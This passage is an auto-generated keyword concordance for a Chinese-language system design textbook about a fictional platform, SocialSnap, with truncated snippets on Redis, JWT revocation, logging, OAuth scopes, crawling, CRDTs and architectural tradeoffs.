  c11_b06.md: ...心记录。“登出”只是删除客户端 cookie，但如果攻击者窃取了 Alice 的 JWT，他们会一直用到过期。  存在 workaround：  * 短 JWT 过期时间（15 分钟）——需要 refresh token（自身带来复杂度） * Redis 中的...
  c11_b06.md: ...赖，部分抵消了无状态收益 * 轮换 secret key——让所有用户的所有 token 失效（强制全局登出）  这些 workaround 都不如 Redis 里的 session ID 干净，因为 session ID 可以一条命令删除。...
  c11_b12.md: ...ID 的集合）——重新引入 Redis 依赖 * 轮换签名密钥——让所有用户的所有 token 全局失效  撤销列表 workaround 部分抵消了 JWT 的无状态收益。对于安全事件需要立即终止会话的应用（金融服务、存在账户入侵场景的社交平台），撤销问题...

=== load (4 occurrences) ===
  c11_b05.md: ...↓     CDN (static assets, public pages)         ↓     L7 Load Balancer (round-robin, health checks)         ↓     ┌──────...
  c17_b04.md: ...的角色。  考虑请求失败时产生的两种日志消息：  **非结构化日志：**       ERROR: Failed to load user profile for request from 192.168.1.45   **结构化日志：**...
  c28_b11.md: ...跨消费者最终 | 极高——复制、持久化 | 高——Zookeeper/KRaft、分区管理 **Round-robin load balancing** (Ch 9) | 无延迟开销 | N/A | 高 | 低 **Least-connection...
  c28_b11.md: ...alancing** (Ch 9) | 无延迟开销 | N/A | 高 | 低 **Least-connections load balancing** (Ch 9) | 避免慢后端而更低 | N/A | 高 | 低 **Consistent ha...

=== cluster (4 occurrences) ===
  c11_b17.md: ...edis 本身必须冗余运行，以避免成为 SPOF。标准配置是 **Redis Sentinel** 或 **Redis Cluster**：一个 Redis 主节点处理写入；一个或多个副本节点持续从主节点复制；Sentinel 进程监控主节点，并在主节点...
  c16_b03.md: ...（第 12 章）减少了数据库 SPOF（主库失败时提升副本为主库）。 * Redis Sentinel 或 Redis Cluster（第 11 章）消除了 Redis 会话存储 SPOF。 * 云基础设施的多个可用区消除了数据中心 SPOF。  消除...
  c20_b06.md: ...求 99.99% 可用性。这意味着 Redis 缓存和数据库都必须高可用。Redis Sentinel 或 Redis Cluster（第 11 章）提供 Redis HA。主-副本自动故障转移（Patroni 或 AWS RDS Multi-AZ）提供...
  c25_b10.md: ...本以保证可用性。每节点 375,000–500,000 操作/秒——在单节点限制内且有边际。生产设计：使用 Redis Cluster，6 节点（3 主 + 3 副本），每主节点峰值约 500,000 操作/秒。这同时提供写入吞吐和故障转移能力。  **...

=== remove (4 occurrences) ===
  c14_b07.md: ...-Counter——任何服务器都可以本地记录一次点赞递增，最终通过合并计算总数。  **OR-Set（Observed-Remove Set）：** 一种同时支持 add 和 remove 的集合，设计上让并发 add 和 remove 操作能确定性地...
  c14_b07.md: ...，最终通过合并计算总数。  **OR-Set（Observed-Remove Set）：** 一种同时支持 add 和 remove 的集合，设计上让并发 add 和 remove 操作能确定性地解决。两个节点可以同时 add 和 remove 同一个...
  c14_b07.md: ...bserved-Remove Set）：** 一种同时支持 add 和 remove 的集合，设计上让并发 add 和 remove 操作能确定性地解决。两个节点可以同时 add 和 remove 同一个元素；CRDT 的合并操作会产生定义好的、一致的...
  c14_b07.md: ...d 和 remove 的集合，设计上让并发 add 和 remove 操作能确定性地解决。两个节点可以同时 add 和 remove 同一个元素；CRDT 的合并操作会产生定义好的、一致的结果。  CRDT 用灵活性换取一致性保证。不是每种数据类型都能...

=== sre (4 occurrences) ===
  c16_b12.md: ...复速度更难实现。  在高频失败环境（硬件故障、网络链路抖动）中，降低 MTTR 通常比大幅降低 MTBF 更可行。这是 SRE 的理念：投资于快速检测、快速诊断和快速恢复，而不是试图让单个组件达到不可能的高可靠性。  **Q2.** 描述熔断器的...
  c17_b07.md: ...过 500ms”、“成功请求比例低于 99.5%”。这些直接测量你关心的事情：服务对用户是否正常工作？  Google SRE 著作把它表述为：对**四个黄金信号**告警：  1. **延迟**——请求耗时多久？（99 百分位超过 SLO 阈值时...
  c17_b13.md: ...SLO 也有内部组织力量：它创造共同责任。没有 SLO 时，“服务够可靠吗？”没有客观答案，团队会因视角不同而争执。SRE 团队说“这个月我们有三次事故——可靠性是危机。”产品团队说“用户没怎么抱怨——看起来还行。”有了 SLO 和错误预算，...
  c28_b03.md: ...理解最深——如果担心个人后果，就不会完整分享知识。组织失去了学习机会。  **无责备 post-mortem** 是由 SRE 团队（Site Reliability Engineering，Google 发展起来的学科）开创的文化实践。原则：p...

=== degraded (4 occurrences) ===
  c16_b15.md: ...—不应被标记为不健康。  **响应格式：**       {       "status": "healthy" | "degraded" | "unhealthy",       "checks": {         "database": {"sta...
  c16_b15.md: ...: "2024-01-15T14:47:23Z"     }   HTTP 状态码：  * 200：healthy 或 degraded（负载均衡器继续路由） * 503：unhealthy（负载均衡器将其移出轮询）  **负载均衡器行为：**...
  c16_b16.md: ...宣布失败，避免瞬态问题抖动）。 * 连续 3 次收到 200 后重新标记为健康（确保恢复稳定后再恢复流量）。 * 返回“degraded”（200 但状态 degraded）时：可选降低该服务器的路由权重——它仍可用但处于压力状态。...
  c16_b16.md: ...连续 3 次收到 200 后重新标记为健康（确保恢复稳定后再恢复流量）。 * 返回“degraded”（200 但状态 degraded）时：可选降低该服务器的路由权重——它仍可用但处于压力状态。...

=== engineer (4 occurrences) ===
  c16_b18.md: ...1. 下午 3:00，网络分区断开 US 和 EU 数据中心之间的链路。 2. 用户 A 在纽约更新个人简介为 “Engineer at SocialSnap”。US 数据中心接受该写（它无法联系 EU 协调，但配置为独立接受写）。 3. 用户 A...
  c16_b18.md: ...系 EU 协调，但配置为独立接受写）。 3. 用户 A 同时（通过漫游 EU 设备）也把简介更新为 “Software Engineer”。EU 数据中心接受该写。 4. 下午 3:30，网络分区恢复。US 数据中心上 bio = "Engineer at...
  c16_b18.md: ...re Engineer”。EU 数据中心接受该写。 4. 下午 3:30，网络分区恢复。US 数据中心上 bio = "Engineer at SocialSnap"；EU 数据中心上 bio = "Software Engineer"。同一条记录有两个冲...
  c16_b18.md: ...中心上 bio = "Engineer at SocialSnap"；EU 数据中心上 bio = "Software Engineer"。同一条记录有两个冲突值。  这就是脑裂。没有冲突解决策略，就必须丢弃一个写。  防护措施：  **围栏令牌 / ep...

=== epoch (4 occurrences) ===
  c16_b18.md: ...er"。同一条记录有两个冲突值。  这就是脑裂。没有冲突解决策略，就必须丢弃一个写。  防护措施：  **围栏令牌 / epoch 号：** 每个数据中心有一个 epoch 号。分区期间，只有 epoch 更高的数据中心（分区前 leader 选举的...
  c16_b18.md: ...脑裂。没有冲突解决策略，就必须丢弃一个写。  防护措施：  **围栏令牌 / epoch 号：** 每个数据中心有一个 epoch 号。分区期间，只有 epoch 更高的数据中心（分区前 leader 选举的“赢家”）允许接受写。另一个数据中心拒绝写...
  c16_b18.md: ...弃一个写。  防护措施：  **围栏令牌 / epoch 号：** 每个数据中心有一个 epoch 号。分区期间，只有 epoch 更高的数据中心（分区前 leader 选举的“赢家”）允许接受写。另一个数据中心拒绝写（牺牲可用性换取一致性）。分区恢...
  c16_b18.md: ...据中心（分区前 leader 选举的“赢家”）允许接受写。另一个数据中心拒绝写（牺牲可用性换取一致性）。分区恢复后，低 epoch 数据中心回放赢家的写。这是第 14 章 CAP 定理的 CP 方案。  **基于 quorum 的写：** 写要求跨两...

=== warn (4 occurrences) ===
  c17_b04.md: ...日志时间戳必须可比；时区歧义会造成抓狂的调试会话。 2. **Severity level**——DEBUG、INFO、WARN、ERROR、FATAL。级别让你过滤噪声：生产环境通常只看 INFO 及以上；调试时临时开启 DEBUG。 3. **...
  c17_b05.md: ...录正常、预期但有意义粒度的事件：“用户登录”、“支付处理完成”、“key X 缓存未命中”。它们讲述正常操作的故事。  WARN 日志记录预期但值得注意的事件：“缓存未命中率超过 50%——可能缓存踩踏”、“用户 Y 触发限流器”。WARN 不是失...
  c17_b05.md: ...事。  WARN 日志记录预期但值得注意的事件：“缓存未命中率超过 50%——可能缓存踩踏”、“用户 Y 触发限流器”。WARN 不是失败，但值得调查。  ERROR 日志记录失败：“数据库查询失败”、“下游服务返回 500”、“通知重试 3 次后...
  c17_b11.md: ...nnel, error, retry_count}` * `notification_dead_lettered` — WARN：`{notification_id, user_id, failure_reason}` — 重试全部失败后的最终失败...

=== reaction (4 occurrences) ===
  c18_b12.md: ...—内部测试（第 2 周）：**  * 仅对内部 SocialSnap 员工用户 ID 启用功能开关。 * 手动测试所有 reaction 流程。 * 监控新端点错误率。  **阶段 4——金丝雀（第 2 周）：**  * 对 5% 用户启用功能开关。 *...
  c18_b12.md: ...。 * 监控新端点错误率。  **阶段 4——金丝雀（第 2 周）：**  * 对 5% 用户启用功能开关。 * 监控：reaction API 错误率、Post Service 延迟（`reaction_count` join 是否增加开销？）、数据库写...
  c18_b12.md: ...。 * 如果指标健康，5 天内逐步 ramp：20% → 50% → 100%。  **回滚计划：**  * 触发条件：reaction API 错误率 5 分钟 > 1%，或 `reactions` 表迁移出现任何错误。 * 动作：对所有用户禁用功能开关...
  c18_b12.md: ...移出现任何错误。 * 动作：对所有用户禁用功能开关（即时，无需部署）。新 API 端点返回 404。Feed 停止显示 reaction 计数。 * 数据库：`reactions` 表和 `reaction_count` 列保留——不影响现有功能。如果功能...

=== scope (4 occurrences) ===
  c19_b14.md: ...2. 应用把用户重定向到 `socialsnap.com/oauth/authorize?client_id=...&scope=read:posts,read:profile&redirect_uri=...&state=random_strin...
  c19_b14.md: ...ion: Bearer <access_token>` header。SocialSnap 验证 JWT 签名并检查 `scope` claim，确保请求操作在授予范围内。  **Token 刷新：** access token 过期时，应用把 re...
  c19_b14.md: ..., expires_at, revoked_at  **最小权限：** Feed Service 验证 JWT 并检查 scope。具有 `read:posts` scope 的应用即使持有有效 JWT 也不能调用 Direct Messages 端...
  c19_b14.md: ...at  **最小权限：** Feed Service 验证 JWT 并检查 scope。具有 `read:posts` scope 的应用即使持有有效 JWT 也不能调用 Direct Messages 端点——授权检查会拒绝它。  **Q2.**...

=== quality (4 occurrences) ===
  c22_b05.md: ...eight × affinity(user, author)           + quality_weight × quality(post)           + recency_weight × recency(post.timestamp)...
  c22_b05.md: ...+ recency_weight × recency(post.timestamp)  其中 `affinity`、`quality`、`recency` 归一化到 [0, 1]，权重之和为 1。  权重不是手动指定——而是从用户行为中学习。如果 A/...
  c24_b03.md: ...）列出每个可用质量级别及每个质量每个片段的 URL。对一部 120 分钟电影用 2 秒片段，清单可能长这样：      Quality: 360p, 500Kbps       Segment 1: https://cdn.example.com/mov...
  c24_b03.md: .../cdn.example.com/movie123/360p/seg002.ts       ...          Quality: 1080p, 5Mbps       Segment 1: https://cdn.example.com/movi...

=== disallow (4 occurrences) ===
  c23_b02.md: ...eb servers）发布该文件说明哪些页面可以爬、哪些不可以以及速率。      User-agent: *     Disallow: /private/     Crawl-delay: 2  设计良好的爬虫在爬某域名任何页面前先读取 `robots...
  c23_b02.md: .../     Crawl-delay: 2  设计良好的爬虫在爬某域名任何页面前先读取 `robots.txt`，并遵守 disallow 指令和 crawl 延迟。这不仅是礼貌，还有法律意义：忽略 `robots.txt` 可能让公司承担法律责任。  **...
  c23_b02.md: ...eb servers）发布该文件说明哪些页面可以爬、哪些不可以以及速率。      User-agent: *     Disallow: /private/     Crawl-delay: 2  设计良好的爬虫在爬某域名任何页面前先读取 `robots...
  c23_b02.md: .../     Crawl-delay: 2  设计良好的爬虫在爬某域名任何页面前先读取 `robots.txt`，并遵守 disallow 指令和 crawl 延迟。这不仅是礼貌，还有法律意义：忽略 `robots.txt` 可能让公司承担法律责任。  **...

=== links (4 occurrences) ===
  c23_b02.md: ...url = queue.dequeue()         page = fetch(url)         links = extract_links(page)         for link in links:...
  c23_b02.md: ...rl)         links = extract_links(page)         for link in links:             queue.enqueue(link)         store(url, page)...
  c23_b07.md: ...ank 页面链接你更有分量。  迭代计算：  PageRank(p) = (1 - d)/N + d × Σ_{q ∈ links to p} PageRank(q)/out-links(q)  其中 d 是阻尼系数（通常 0.85），N 是总页数，...
  c23_b07.md: ...ank(p) = (1 - d)/N + d × Σ_{q ∈ links to p} PageRank(q)/out-links(q)  其中 d 是阻尼系数（通常 0.85），N 是总页数，求和覆盖所有链接到 p 的页面 q。  这是迭代计算的：...

=== running (4 occurrences) ===
  c23_b05.md: ...会创建巨大 posting list 却只有微不足道的排序收益。 5. **词干提取或词形还原：** 把词还原为词根。"Running"、"ran"、"runs" 都可能变成 "run"。这让查询 "running distributed systems...
  c23_b05.md: ...提取或词形还原：** 把词还原为词根。"Running"、"ran"、"runs" 都可能变成 "run"。这让查询 "running distributed systems（分布式系统）" 能匹配包含 "run distributed system"...
  c23_b05.md: ...会创建巨大 posting list 却只有微不足道的排序收益。 5. **词干提取或词形还原：** 把词还原为词根。"Running"、"ran"、"runs" 都可能变成 "run"。这让查询 "running distributed systems...
  c23_b05.md: ...提取或词形还原：** 把词还原为词根。"Running"、"ran"、"runs" 都可能变成 "run"。这让查询 "running distributed systems（分布式系统）" 能匹配包含 "run distributed system"...

=== inverse (4 occurrences) ===
  c23_b06.md: ...s" 50 次呢？"systems" 太常见，高频几乎不能说明什么。  TF-IDF（Term Frequency - Inverse Document Frequency）的直觉是：  * **Term Frequency (TF)：** 一个词在文档...
  c23_b06.md: ...出现很多次，可能对文档很重要。如果 "consistency" 在文档中出现 30 次，该文档很可能讲一致性。 * **Inverse Document Frequency (IDF)：** 一个词在极少文档中出现，它出现时就是强信号。如果 "zkSNA...
  c28_b02.md: ...#### 逆康威机动  如果康威定律是描述，那么 **Inverse Conway Maneuver** 就是处方：有意按照你想要的架构来 structuring 你的组织。  如果你想要...
  intro.md: ...是否愿意都会塑造系统，blameless post-mortems（无追责事后复盘）为何是可靠性机制而非管理仪式，以及 Inverse Conway Maneuver（逆康威策略）有时为何是最有效的架构干预手段。本书认真对待一个理念：系统由人建造，而不只...

=== segment (4 occurrences) ===
  c24_b03.md: ...120 分钟电影用 2 秒片段，清单可能长这样：      Quality: 360p, 500Kbps       Segment 1: https://cdn.example.com/movie123/360p/seg001.ts       Se...
  c24_b03.md: ...nt 1: https://cdn.example.com/movie123/360p/seg001.ts       Segment 2: https://cdn.example.com/movie123/360p/seg002.ts       .....
  c24_b03.md: ...0p/seg002.ts       ...          Quality: 1080p, 5Mbps       Segment 1: https://cdn.example.com/movie123/1080p/seg001.ts       S...
  c24_b03.md: ...t 1: https://cdn.example.com/movie123/1080p/seg001.ts       Segment 2: https://cdn.example.com/movie123/1080p/seg002.ts       ....

=== hint (4 occurrences) ===
  c26_b04.md: ...ist 中的 W 个节点。若标准节点 A 不可用，附近的另一节点 B 代替接受该写，并在元数据中记录它作为节点 A 的“hint”持有该值。  当节点 A 恢复时，节点 B 通过 gossip（稍后讨论）检测到 A 回来，并把 hinted 数据发...
  c26_b04.md: ...sip（稍后讨论）检测到 A 回来，并把 hinted 数据发送给它。A 收到 hinted 数据后变最新，B 丢弃其 hint。这就是 **hinted handoff**：B 为 A 临时保存数据，A 回来后再交还。  plain 语言：当某键...
  c26_b08.md: ...：** Hinted handoff：当某键的标准节点 A 不可用时，邻近节点 B 临时存储本该给 A 的值，元数据中“hint”该值属于 A。A 恢复后，B 把 hinted 数据转发给 A（handoff）并丢弃自己的副本。Hinted han...
  c26_b10.md: ...就满足写 quorum。A 也复制给 B（都在 preference list 且可达）。C 不可达；A（或 B）存储 hint：“节点 C 恢复时应接收该值。” 写成功并返回客户端。分区愈合后：B 或 A 通过 gossip 检测到 C 恢复，把...

=== scaling (4 occurrences) ===
  c26_b12.md: ...正确状态。  **Q2.** 全书都在为本章铺垫。前五个部分——Foundations、Building Blocks、Scaling Patterns、Reliability、Case Studies——中哪个概念最直接重现在分布式键值存储设计中？...
  c26_b13.md: ...。键值存储本身是第 6 章（NoSQL）的主题——现在我们看到其内部。复制机制呼应第 12 章数据库复制模式（下一章）。Scaling Patterns（第 11–15 章）：虚拟节点（第 12 章分片概念）分布负载。水平扩展原则（第 11 章）适用：任...
  c28_b12.md: ...t | Operational Complexity ---|---|---|---|--- **Horizontal scaling** (Ch 11) | 无延迟成本；支持更多并行 | 要求无状态设计 | 高——故障只影响 1/N 流量 | 中——需...
  c28_b12.md: ...成本 | N/A（状态外置） | 极高——任意服务器处理任意请求 | 单服务器低；外部状态存储中 **Vertical scaling** (Ch 11) | 更低延迟（更快硬件） | N/A | 低——单机器 SPOF | 低 **Read repli...

=== demonstrably (4 occurrences) ===
  c27_b03.md: ...行数据迁移。  **为什么等待：** 分片增加巨大运营复杂度。团队在绝对必要时才做，这是正确的。规则：只在更简单的方案 demonstrably 不足时才增加复杂度。  **技术债务：** 分片键选择（`user_id mod 8`）意味着以后加更多分片需要重新映...
  c27_b04.md: ...于案例研究章节中描述的主要社交平台。但注意：它花了 48 个月才达到这里。它不是一次性设计出来的。每个组件只在现有系统 demonstrably 无法处理负载时才添加。  * * *   ### 27.2 技术债务——分类与管理  SocialSnap 的每个版本...
  c27_b07.md: ...滚（或至少可恢复）的。团队从不进行不可逆的架构变更，除非经过广泛规划和回滚程序。  **适时复杂度：** 只在现有系统 demonstrably 无法满足需求时才增加复杂度。SocialSnap 在技术必要性出现数月后才添加分片——但也没更早。避免的每个过早优化都...
  c27_b11.md: ...。把答案格式化为表格。  提示  你不需要完美回忆每章——推理每个版本增加了什么以及解决了什么问题。信号总是“当前系统 demonstrably 无法处理 X”。  **答案：**  版本 | 决策 | 做出的权衡 | 变革信号 ---|---|---|--- v...

=== owning (4 occurrences) ===
  c27_b06.md: ...扩展；跨分片查询需要应用层 join；分片数难以改变。”  **v6（微服务）时：** “微服务分解——独立部署和团队 owning；需要分布式追踪；更高运营复杂度。”  维护这个矩阵的力量：新工程师加入团队时，可以读 Tradeoff Matrix，...
  c27_b10.md: ...rvice（处理认证和会话管理）。他们应问哪些问题来判断这次拆分是否值得？拆分引入哪些权衡？  提示  思考耦合、团队 owning 和部署独立性。服务间通信方式需要改变什么？会引入哪些新故障模式？  **答案：** 应问的问题：(1) profile...
  c28_b15.md: ...(Ch 13, 28) | 服务间更高；支持独立扩展 | 服务间最终 | 更高——部分失败隔离 | 极高——需要服务 owning 模型 **Blameless post-mortems** (Ch 28) | N/A | N/A | 随时间改善（从...
  c28_b20.md: ...6 个团队建立。下线原始单体（或保留最小“core”服务）。关键时机原则：团队组建必须先于服务提取。永远不要在没准备好 owning 团队的团队前拆分服务。  **Q2.** 用 28.7 节的技术评估框架，评估 SocialSnap 是否应采纳新的时...

=== team (4 occurrences) ===
  c28_b02.md: ...SocialSnap 在 v6 有意识地这样做：在把单体分解为微服务之前，CTO 围绕预期的服务边界重组团队。Feed Team、User Team、Notification Team 和 Post Team 成立。然后，每个团队的第一个项目就是从...
  c28_b02.md: ...在 v6 有意识地这样做：在把单体分解为微服务之前，CTO 围绕预期的服务边界重组团队。Feed Team、User Team、Notification Team 和 Post Team 成立。然后，每个团队的第一个项目就是从单体中提取自己的服务...
  c28_b02.md: ...分解为微服务之前，CTO 围绕预期的服务边界重组团队。Feed Team、User Team、Notification Team 和 Post Team 成立。然后，每个团队的第一个项目就是从单体中提取自己的服务。最终的服务与团队边界干净地映射——...
  c28_b02.md: ...围绕预期的服务边界重组团队。Feed Team、User Team、Notification Team 和 Post Team 成立。然后，每个团队的第一个项目就是从单体中提取自己的服务。最终的服务与团队边界干净地映射——因为团队结构正是为了产生...

=== browser (3 occurrences) ===
  c01_b02.md: ...PostgreSQL 数据库 * 托管在一台笔记本电脑（或廉价 VPS）上 * 三个用户：你和两个朋友      [ Browser ] ──HTTP──> [ Flask App + PostgreSQL ] (one machine)  这是一个完...
  c05_b06.md: ...1——加入关系型数据库  让我们把所有这些应用到给 SocialSnap 第一个真正的数据库。架构从：       [ Browser ] ──HTTP──> [ Flask App + in-memory dict ] (one machine)...
  c05_b06.md: ...[ Flask App + in-memory dict ] (one machine)   升级到：       [ Browser ] ──HTTP──> [ Flask App ] ──SQL──> [ PostgreSQL ] (one mach...

=== system (3 occurrences) ===
  c01_b06.md: ...### 1.4 这本书将教你什么  书名是“System Design Thinking（系统设计思维）”，而“思维”这个词是刻意的。这不是一本答案之书。系统设计没有正确答案—...
  c23_b05.md: ..."running distributed systems（分布式系统）" 能匹配包含 "run distributed system" 的文档。 6. **倒排索引更新：** 对每个剩余 token，把该文档的 ID、TF 和位置追加到 token 的...
  c23_b08.md: ...化和停用词移除。"Distributed Systems Consistency" 变成 ["distribut", "system", "consist"]（词干提取后）。 2. **词项查找：** 对每个词，从倒排索引（可能跨多个分片）检索其 po...

=== second (3 occurrences) ===
  c02_b01.md: ...oughput（吞吐）** 是系统每单位时间能处理的操作数量。对于 Web 服务，通常用 **requests per second（RPS，每秒请求数）** 或 **queries per second（QPS，每秒查询数）** 表示。  用大白话说...
  c02_b01.md: ...b 服务，通常用 **requests per second（RPS，每秒请求数）** 或 **queries per second（QPS，每秒查询数）** 表示。  用大白话说：吞吐是系统能同时持续做多少件事。如果你的 Web 服务器在性能下降前能...
  c05_b01.md: ...02 | 2 | "Hello world from Bob" | 2024-01-21 | | 103 | 1 | "Second post!" | 2024-01-22 |  注意 posts 表里的 `user_id` 列。Post 101 的...

=== step (3 occurrences) ===
  c02_b10.md: ...个服务是否真的需要在同步关键路径上——如果通知邮件晚 30 秒而不是立即到达，用户体验会怎样？  **答案：**  **Step 1（第一步）：计算合并可用性。**  合并可用性 = 0.9995 × 0.999 = 0.9985005  四舍五入...
  c02_b10.md: ...可用性 = 0.9995 × 0.999 = 0.9985005  四舍五入：**99.85% 合并可用性。**  **Step 2（第二步）：换算成每年停机时间。**  停机比例 = 1 − 0.9985 = 0.0015  每年分钟数 = 36...
  c02_b10.md: ...,600 × 0.0005 ≈ 263 分钟（约 4.4 小时）。加上通知服务让总停机时间**翻了不止三倍**。  **Step 3（第三步）：架构改动。**  把通知服务从同步结账路径移除。从：       User → Payment Serv...

=== open (3 occurrences) ===
  c03_b04.md: ...：2300 万 / 8000 = 2875 → 向上取整约 3000 台活跃服务器  Netflix 实际使用一个名为 Open Connect 的自定义 CDN，在 ISP 中部署了数千台服务器。这个估算得到了正确的数量级。...
  c10_b11.md: ...**文件存储**（如 NFS）提供分层目录结构，客户端挂载后像本地磁盘一样使用。多个客户端可同时读写文件。文件操作——open、read、write、seek、append——在字节级别工作，文件系统维护元数据（权限、修改时间、目录结构）。  *...
  c17_b08.md: ...dis 部署；如果 30 分钟内部署过，回滚 5. 如果最近没有部署：上报数据库团队；把 Redis 客户端熔断器设为 OPEN  Runbook 编码机构知识。资深工程师第一次遇到某个告警时学到正确响应。初级工程师 on-call 遇到不熟悉告警...

=== carol (3 occurrences) ===
  c05_b01.md: ...| bob | bob@example.com | `$2b$12...` | 2024-01-20 | | 3 | carol | carol@example.com | `$2b$12...` | 2024-02-01 |  **posts 表...
  c05_b01.md: ...bob@example.com | `$2b$12...` | 2024-01-20 | | 3 | carol | carol@example.com | `$2b$12...` | 2024-02-01 |  **posts 表**  | id...
  c06_b05.md: ...IENDS_WITH → Node: Bob (id: 2)       → FRIENDS_WITH → Node: Carol (id: 3)       → FRIENDS_WITH → Node: Dave (id: 4)      Node...

=== example (3 occurrences) ===
  c05_b01.md: ...sh | created_at | |---|---|---|---|---| | 1 | alice | alice@example.com | `$2b$12...` | 2024-01-15 | | 2 | bob | bob@example.co...
  c05_b01.md: ...ce@example.com | `$2b$12...` | 2024-01-15 | | 2 | bob | bob@example.com | `$2b$12...` | 2024-01-20 | | 3 | carol | carol@exampl...
  c05_b01.md: ...xample.com | `$2b$12...` | 2024-01-20 | | 3 | carol | carol@example.com | `$2b$12...` | 2024-02-01 |  **posts 表**  | id | user_...

=== serializable (3 occurrences) ===
  c05_b05.md: ...默认） | | Repeatable Read（可重复读） | 防止 | 防止 | 可能 | 事务内的金融读取 | | Serializable（可串行化） | 防止 | 防止 | 防止 | 最高正确性要求 |  大多数 Web 应用使用 **Read Commi...
  c05_b05.md: ...使用 **Read Committed**——它防止读到另一个事务未提交的更改，同时保持良好并发。只在正确性要求时才用 Serializable，因为它会显著降低吞吐。   #### 常见误解  许多开发者认为“我在用关系型数据库，所以我的数据总是一致的”。这错在...
  c05_b14.md: ...、隔离性（并发事务互不干扰）、持久性（已提交数据在崩溃后幸存）。隔离有级别——Read Committed 是常见默认，Serializable 在更高成本下提供最大正确性。  我们介绍了 **SocialSnap v1**：一个由 PostgreSQL 数据库支...

=== dict (3 occurrences) ===
  c05_b06.md: ...据库。架构从：       [ Browser ] ──HTTP──> [ Flask App + in-memory dict ] (one machine)   升级到：       [ Browser ] ──HTTP──> [ Flask...
  c11_b13.md: ..."         cached = local_cache.get(cache_key)  # 进程内 Python dict（TTL 300 秒）         if cached:             return cached...
  c11_b14.md: ...cached = redis.get(cache_key)          # 共享 Redis，不是本地 dict         if cached:             return json.loads(cached)...

=== wal (3 occurrences) ===
  c05_b07.md: ...（单节点）** | ↓ 中等（索引有帮助） | ↓ 有限（单机） | ↑↑ ACID 保证 | ↓ 单点故障 | ↑↑ WAL + ACID 持久性 | ↓ 成熟、工具完善 | | **添加 B-tree 索引** | ↓ 大幅降低读 | ↔ 写...
  c10_b11.md: ...*  PostgreSQL（像所有数据库）需要块级随机读写——能够读写文件中特定块而不读整个文件。PostgreSQL WAL 写入会更新 WAL 文件的特定字节。B-tree 插入会修改索引文件中特定页面。这些都是小而随机的原地修改。...
  c10_b11.md: ...SQL（像所有数据库）需要块级随机读写——能够读写文件中特定块而不读整个文件。PostgreSQL WAL 写入会更新 WAL 文件的特定字节。B-tree 插入会修改索引文件中特定页面。这些都是小而随机的原地修改。...

=== mostly (3 occurrences) ===
  c05_b09.md: ...慢？** 对小于 10,000（1 万）行的表，索引帮助很小——全表扫描已经够快。 3. **读/写比例如何？** 对 mostly-read 的表（如国家代码查询表），可以大胆加索引。对 mostly-write 的表（如事件日志），应谨慎加索引。...
  c05_b09.md: ...描已经够快。 3. **读/写比例如何？** 对 mostly-read 的表（如国家代码查询表），可以大胆加索引。对 mostly-write 的表（如事件日志），应谨慎加索引。 4. **列是否选择性高？** 对布尔列（true/false）建索引...
  c22_b09.md: ...行金丝雀测试，再全量部署。  **内容多样性：** 纯相关性排序会重复显示同类内容——如果你昨天与猫照片互动，今天就看 mostly 猫照片。多样性约束确保 feed 包含多样内容：不同主题、不同关注账号、不同内容格式。  **赞助内容插入：** 广告...

=== text (3 occurrences) ===
  c05_b11.md: ...name        VARCHAR(100) NOT NULL,         bio         TEXT,         avatar_url  VARCHAR(500),         joined_at   TIME...
  c05_b11.md: ...REFERENCES users(id) ON DELETE CASCADE,         content     TEXT NOT NULL,         image_urls  TEXT[],         created_at  T...
  c05_b11.md: ...ADE,         content     TEXT NOT NULL,         image_urls  TEXT[],         created_at  TIMESTAMP DEFAULT NOW()     );  **设计...

=== attributes (3 occurrences) ===
  c06_b02.md: ...,       "price": 29.99,       "category": "apparel",       "attributes": {         "sizes": ["S", "M", "L", "XL"],         "colors...
  c06_b02.md: ..."price": 1299.99,       "category": "electronics",       "attributes": {         "processor": "Intel i7",         "ram_gb": 16,...
  c06_b02.md: ...档共存于同一个集合（collection）。当另一个文档增加新属性类型时，两者都不需要 schema 迁移。应用读取 `attributes` 子文档并处理其中存在的任何字段。   #### 文档存储何时胜出  **灵活或演进的 schema：** 内容管理系...

=== name (3 occurrences) ===
  c06_b02.md: ...// t-shirt product     {       "_id": "prod_001",       "name": "Classic Tee",       "price": 29.99,       "category": "a...
  c06_b02.md: ...// laptop product     {       "_id": "prod_002",       "name": "ProBook 15",       "price": 1299.99,       "category": "...
  c06_b12.md: ...ients (         id              SERIAL PRIMARY KEY,         name            VARCHAR(200) NOT NULL,         dob             D...

=== storage (3 occurrences) ===
  c28_b11.md: ...e limiting** (Ch 9) | 被限流请求增加延迟 | N/A | 保护服务可用性 | 中 **Block storage (SSD/HDD)** (Ch 10) | SSD 低，HDD 中 | 持久 | 中 | 低 **Object sto...
  c28_b11.md: ...age (SSD/HDD)** (Ch 10) | SSD 低，HDD 中 | 持久 | 中 | 低 **Object storage (S3)** (Ch 10) | 中（网络往返） | 最终（可选强一致） | 极高（11 个 9（11 nines）持...
  c28_b11.md: ...） | 最终（可选强一致） | 极高（11 个 9（11 nines）持久性） | 低 **Cold/archival storage** (Ch 10) | 高（检索需分钟） | 持久 | 高 | 低（成本优化）    （术语译法：一致性（consis...

=== mem (3 occurrences) ===
  c06_b04.md: ...ns: timestamps → metric values       "09:00:00" → {cpu: 45, mem: 72, disk_io: 12, ...}       "09:00:01" → {cpu: 47, mem: 72...
  c06_b04.md: ...45, mem: 72, disk_io: 12, ...}       "09:00:01" → {cpu: 47, mem: 72, disk_io: 14, ...}       ...       "09:59:59" → {cpu: 4...
  c06_b04.md: ...2, disk_io: 14, ...}       ...       "09:59:59" → {cpu: 43, mem: 71, disk_io: 11, ...}   某台服务器某天的所有指标连续存储。查询“给我 server-001...

=== values (3 occurrences) ===
  c06_b04.md: ..., "server-001:2024-01-15")     Columns: timestamps → metric values       "09:00:00" → {cpu: 45, mem: 72, disk_io: 12, ...}...
  c25_b06.md: ...INSERT INTO billing_ledger (trip_id, amount, type) VALUES (X, fare, 'CHARGE');         INSERT INTO billing_ledger (tr...
  c25_b06.md: ...INSERT INTO billing_ledger (trip_id, amount, type) VALUES (X, driver_payout, 'CREDIT');         UPDATE trips SET stat...

=== state (3 occurrences) ===
  c06_b06.md: ...#### 定义：BASE  **BASE** 代表 **Basically Available, Soft state, Eventually consistent（基本可用、软状态、最终一致）。**  * **基本可用（Basicall...
  c06_b06.md: ...lable）：** 系统始终可用（没有“服务不可用”错误），但响应可能是旧的或基于部分数据。 * **软状态（Soft state）：** 即使没有新写入，系统状态也会随时间变化，因为副本在收敛到一致性。 * **最终一致（Eventually co...
